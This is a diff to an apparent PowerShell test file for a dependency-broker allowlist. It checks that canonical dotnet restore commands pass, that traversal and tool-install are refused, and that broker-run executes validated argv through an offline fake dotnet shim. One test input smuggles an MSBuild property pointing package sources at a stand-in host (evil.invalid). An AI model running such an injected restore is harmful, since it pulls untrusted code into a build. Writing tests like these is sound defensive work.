@@ -18,8 +18,9 @@
       * timeout and non-zero RC;
       * permission / availability refusal (codex not resolvable -> CODEX_UNAVAILABLE);
       * sandbox-init failure (CreateProcessAsUserW failed: 5 -> ENV_LIMIT/sandbox-init);
-      * dependency-broker allowlist (accept canonical, reject metacharacters /
-        non-allowlisted / non-canonical);
+      * dependency-broker allowlist and execution (accept canonical, reject
+        metacharacters / non-allowlisted / non-canonical, execute safe argv in
+        the requested worktree through the shared runtime cleanup path);
       * invalid codex output (reviewer RECHECK/NEW validation, oversized diff);
       * active-VCS working-copy status in a colocated jj+git repo where Git is
         clean but jj has a substantive uncommitted working-copy revision;
@@ -476,6 +477,84 @@ function Get-ArgsCaptured {
 
     $pip = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'pip install -r requirements.txt')
     Assert-Equal $true $pip.Json.allowed 'broker: pip install -r <file> allowed'
+
+    $dotnetTool = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'dotnet tool restore')
+    Assert-Equal $true $dotnetTool.Json.allowed 'broker: canonical dotnet tool restore is allowed'
+
+    $dotnetRoot = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'dotnet restore')
+    Assert-Equal $true $dotnetRoot.Json.allowed 'broker: canonical root dotnet restore is allowed'
+
+    $dotnetTarget = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'dotnet restore src/App.fsproj')
+    Assert-Equal $true $dotnetTarget.Json.allowed 'broker: relative dotnet project target is allowed'
+
+    $dotnetTraversal = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'dotnet restore ../outside.csproj')
+    Assert-Equal $false $dotnetTraversal.Json.allowed 'broker: parent-traversing dotnet target is rejected'
+
+    $dotnetProperty = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'dotnet restore -p:RestoreSources=https://evil.invalid')
+    Assert-Equal $false $dotnetProperty.Json.allowed 'broker: dotnet MSBuild property injection is rejected'
+
+    $dotnetInstall = Invoke-Runtime -RuntimeArgs @('broker-validate', '--command', 'dotnet tool install anything')
+    Assert-Equal $false $dotnetInstall.Json.allowed 'broker: dotnet tool install is outside the allowlist'
+
+    $deniedRun = Invoke-Runtime -RuntimeArgs @(
+        'broker-run', '--worktree', (New-TempDir), '--command', 'dotnet tool install anything'
+    )
+    Assert-Equal 2 $deniedRun.ExitCode 'broker-run: rejected command fails closed before execution'
+    Assert-Equal 'validate' $deniedRun.Json.stage 'broker-run: rejected command reports validation stage'
+    Assert-Equal $false $deniedRun.Json.allowed 'broker-run: rejected command is never executed'
+
+    # broker-run is the only execution path adapters may use. Prove it carries the
+    # validated tokens as argv (not a shell string), runs in the requested worktree,
+    # and returns a structured result. A PATH-prepended fake keeps the test offline.
+    $fakeBin = New-TempDir
+    $fakeWorktree = New-TempDir
+    $fakeArgs = New-TempFile
+    $fakeCwd = New-TempFile
+    $onWindows = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform(
+        [System.Runtime.InteropServices.OSPlatform]::Windows)
+    if ($onWindows) {
+        $fakeDotnet = Join-Path $fakeBin 'dotnet.cmd'
+        $body = (@'
+@echo off
+>"%FAKE_BROKER_ARGS_FILE%" echo %*
+>"%FAKE_BROKER_CWD_FILE%" echo %CD%
+exit /b 0
+'@ -replace "`n", "`r`n")
+        [System.IO.File]::WriteAllText($fakeDotnet, $body, $script:Utf8)
+        $pathSep = ';'
+    } else {
+        $fakeDotnet = Join-Path $fakeBin 'dotnet'
+        $body = @'
+#!/bin/sh
+printf '%s' "$*" > "$FAKE_BROKER_ARGS_FILE"
+pwd > "$FAKE_BROKER_CWD_FILE"
+exit 0
+'@
+        [System.IO.File]::WriteAllText($fakeDotnet, $body, $script:Utf8)
+        & chmod +x $fakeDotnet
+        $pathSep = ':'
+    }
+    $brokerEnv = @{
+        PATH = $fakeBin + $pathSep + $env:PATH
+        FAKE_BROKER_ARGS_FILE = $fakeArgs
+        FAKE_BROKER_CWD_FILE = $fakeCwd
+    }
+    $brokerRun = Invoke-Runtime -RuntimeArgs @(
+        'broker-run', '--worktree', $fakeWorktree, '--command', 'dotnet tool restore', '--timeout-sec', '30'
+    ) -EnvVars $brokerEnv
+    Assert-Equal 0 $brokerRun.ExitCode 'broker-run: runtime returns structured command result'
+    Assert-Equal $true $brokerRun.Json.ok 'broker-run: validated fake dotnet command succeeds'
+    Assert-Equal 'dotnet tool restore' $brokerRun.Json.canonical 'broker-run: canonical command recorded'
+    $hasFakeArgs = Test-Path -LiteralPath $fakeArgs -PathType Leaf
+    $hasFakeCwd = Test-Path -LiteralPath $fakeCwd -PathType Leaf
+    Assert-True $hasFakeArgs ('broker-run: fake wrote argv capture; stderr=' + [string]$brokerRun.Json.stderr)
+    Assert-True $hasFakeCwd ('broker-run: fake wrote cwd capture; stderr=' + [string]$brokerRun.Json.stderr)
+    if ($hasFakeArgs) {
+        Assert-Equal 'tool restore' ([System.IO.File]::ReadAllText($fakeArgs).Trim()) 'broker-run: fake receives two literal argv tokens'
+    }
+    if ($hasFakeCwd) {
+        Assert-Equal (Resolve-Path -LiteralPath $fakeWorktree).Path ([System.IO.File]::ReadAllText($fakeCwd).Trim()) 'broker-run: child cwd is the requested worktree'
+    }
 }.Invoke()
 
 # =============================================================================
